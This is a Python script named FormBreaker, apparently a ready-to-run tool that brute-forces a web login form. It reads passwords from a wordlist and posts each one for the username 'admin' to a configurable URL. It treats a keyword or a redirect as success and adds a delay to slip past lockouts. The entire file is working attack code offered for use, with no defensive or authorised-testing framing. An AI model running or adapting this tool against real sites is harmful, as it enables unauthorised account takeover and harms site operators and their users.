#!/usr/bin/env python3
# FormBreaker by adhamhas

import requests
import time
from colorama import Fore, Style, init
import sys

init(autoreset=True)

# ========================= CONFIG ========================= #
URL = "http://example.com/login"  # Change to your login URL
USERNAME = "admin"                # Fixed username
WORDLIST = "pwordlist"            # Your password list file
SUCCESS_KEYWORD = "You have logged in"  # Or status_code == 302
DELAY = 0.5                       # Seconds between tries (avoid lockouts)
HEADERS = {
    "User-Agent": "Mozilla/5.0"
}
# ========================================================== #

def try_login(password):
    data = {
        "username": USERNAME,
        "password": password
    }

    try:
        response = requests.post(URL, data=data, headers=HEADERS, timeout=10, allow_redirects=False)
        if SUCCESS_KEYWORD in response.text or response.status_code in [302, 301]:
            return True
        return False
    except requests.RequestException as e:
        print(Fore.RED + f"[!] Network error: {e}")
        return False

def brute_force():
    print(Fore.CYAN + f"[~] Starting brute-force on: {URL}")
    print(Fore.YELLOW + f"[~] Using username: {USERNAME}")
    start_time = time.time()

    try:
        with open(WORDLIST, 'r') as file:
            passwords = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + "[!] Password file not found.")
        sys.exit(1)

    total = len(passwords)
    print(Fore.CYAN + f"[~] {total} passwords loaded.\n")

    for i, pwd in enumerate(passwords, start=1):
        print(Fore.WHITE + f"[-] Trying ({i}/{total}): {pwd}", end='\r')
        if try_login(pwd):
            elapsed = time.time() - start_time
            print(Fore.GREEN + f"\n[✓] SUCCESS! Password found: {pwd}")
            print(Fore.GREEN + f"[✓] Time elapsed: {elapsed:.2f} seconds")
            return

        time.sleep(DELAY)

    print(Fore.RED + "\n[✗] Brute-force failed. No valid password found.")

if __name__ == "__main__":
    brute_force()
